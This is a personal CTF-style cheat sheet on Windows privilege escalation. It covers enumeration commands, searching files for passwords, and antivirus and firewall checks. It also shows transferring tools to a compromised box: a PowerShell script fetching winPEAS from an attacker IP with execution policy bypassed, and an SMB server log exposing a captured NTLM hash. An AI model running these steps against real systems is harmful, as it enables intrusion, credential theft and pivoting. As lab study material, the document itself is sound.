---
title: Windows Privilege Escalation
draft: false
tags:
  - windows
  - privilege-escalation
---

## Plot
Let's say you have successfully compromised the system with lower user privilege. You would have to escalate your privilege into root. 

More elaborate steps could be found on [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/) or [sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

Here, I uploaded check list and personal tricks.



## Checklist
- [ ] Kernel Exploit?
- [ ] privileges?
- [ ] groups?
- [ ] Internal services?
- [ ] Pivoting?
- [ ] File Enumeration?
- [ ] Password Hunting?
- [ ] Scheduled Tasks?


## Basic Enumeration

### Kernel Exploit

  
```bash
systeminfo
hostname
wmic qfe get Caption,Description,HotFixID,InstalledOn
```


### Privilege

Check on user privilege:

```powershell
whoami /priv
```

- Check for **SeImpersonatePrivilege**: Potato Attack

- Check for **SeMachineAccountPrivilege**: Certify.exe

### User & Group


```powershell
whoami /all
net users
net user 'username'
net user administrator
net localgroup
net localgroup administrators
net /group domain
whoami /groups
```

### File Enumeration

First go to **C:** and see if there are and hidden directory:

```powershell
dir -force
gci -force
dir /R
```

You can also search for passwords:

```powershell
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
## Network Information

Check for services only open internally:

**Local address 0.0.0.0**  
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

**Local address 127.0.0.1**  
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. **This is interesting to us!**

**Local address 192.168.1.9**  
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. **This is also interesting to us!**

Also check for pivoting.

```bash
ipconfig
ipconfig /all
route print
arp -a (shows all devices on network)
netstat -ano

netsh firewall show state
netsh advfirewall firewall
netsh advfirewall dump
netsh advfirewall show allprofiles
```


If there are services running internally, check if it is running currently:

```powershell
tasklist
ps
wmic service list brief
tastlist /SVC
schtasks /query /fo LIST /v
```


## AV Detection


Usually not needed during CTF.

-antivirus

```powershell
sc query windefend
sc queryex type= service
```

-firewall setting

```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

  
  
  

## File Transfer

  

## Transferring winpeas.exe


The following sequence of commands creates a PowerShell script named **wget.ps1** that performs the download of a file (**winpeas.exe**) from a specified URL (http://10.10.16.22/winpeas.exe) using the **System.Net.WebClient** class.

Obviously, I have Python HTTP server running with **winpeas.exe** on the server.


```powershell
c:\Users\Public>echo $storageDir = $pwd > wget.ps1

echo $storageDir = $pwd > wget.ps1

c:\Users\Public>echo $webclient = New-Object System.Net.WebClient >>wget.ps1

echo $webclient = New-Object System.Net.WebClient >>wget.ps1

c:\Users\Public>echo $url = "http://10.10.16.22:80/winPEASany_ofs.exe" >>wget.ps1

echo $url = "http://10.10.16.22:80/winPEASany_ofs.exe" >>wget.ps1

c:\Users\Public>echo $file = "output-file.exe" >>wget.ps1

echo $file = "output-file.exe" >>wget.ps1

c:\Users\Public>echo $webclient.DownloadFile($url,$file) >>wget.ps1

echo $webclient.DownloadFile($url,$file) >>wget.ps1

c:\Users\Public>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Now I have the file on the box:

[Reference](https://d00mfist.gitbooks.io/ctf/content/transfering_files_to_windows.html)

  

### impacket-smbserver

  

I started impacket-smbserver on the directory where I have chisel for windows downloaded:

```bash
┌──(yoon㉿kali)-[/opt/chisel]
└─$ impacket-smbserver share $(pwd) -smb2support
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.198,49709)
[*] AUTHENTICATE_MESSAGE (BUFF\shaun,BUFF)
[*] User BUFF\shaun authenticated successfully
[*] shaun::BUFF:aaaaaaaaaaaaaaaa:88bf12d0cc9b3c7901bb2dba46eef3e5:01010000000000000094cfb7c826da0173276d717b2863490000000001001000560054004f007a004600780062004c0003001000560054004f007a004600780062004c0002001000740079004d004100430064006e00500004001000740079004d004100430064006e005000070008000094cfb7c826da0106000400020000000800300030000000000000000000000000200000bf2c19dd9da880406292e63bbae8800a290ba0d9bc31ed864a57d99e51f9f83d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
```


Now I have chisel for windows on the box. which I downloaded as **c.exe**:


```powershell
C:\xampp\htdocs\gym\upload>copy \\10.10.14.9\share\c_w c.exe
1 file(s) copied.
```

  
